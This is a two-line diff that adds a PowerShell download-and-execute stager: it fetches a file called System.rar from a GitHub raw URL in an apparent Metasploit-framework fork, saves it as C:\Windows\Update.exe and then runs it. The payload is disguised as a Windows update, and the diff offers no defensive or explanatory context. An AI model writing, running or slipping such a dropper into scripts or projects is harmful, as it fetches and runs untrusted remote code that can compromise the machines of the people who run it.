@@ -1,0 +1,2 @@
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/youaresmart/metasploit-framework/master/external/System.rar','C:\Windows\Update.exe');
+C:\Windows\Update.exe
